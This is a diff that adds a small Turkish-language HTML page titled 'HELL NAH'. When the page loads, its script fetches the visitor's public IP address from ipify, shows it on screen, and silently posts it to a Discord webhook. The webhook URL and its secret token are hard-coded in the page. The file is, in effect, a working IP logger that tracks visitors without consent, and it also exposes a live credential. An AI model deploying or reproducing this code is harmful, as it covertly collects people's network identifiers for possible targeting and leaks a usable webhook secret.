@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+<meta charset="UTF-8">
+<title>HELL NAH</title>
+</head>
+<body>
+<h1 id="ip">Initializing...</h1>
+
+<script>
+fetch('https://api.ipify.org?format=json')
+  .then(response => response.json())
+  .then(data => {
+    document.getElementById('ip').textContent = `${data.ip}`;
+    
+    
+    fetch('https://discord.com/api/webhooks/1410178174809149493/26SEo3GFHuKP_kPnp3xt1zNt44g7TfqjD9pHbUjXLo-T9qYTeuSk8Fb6HWZV9ePE98XO', {
+       method: 'POST',
+       headers: { 'Content-Type': 'application/json' },
+       body: JSON.stringify({ content: `new ip: ${data.ip}` })
+    });
+  })
+  .catch(err => {
+    console.error(err);
+    document.getElementById('ip').textContent = 'IP alınamadı.';
+  });
+</script>
+</body>
+</html>
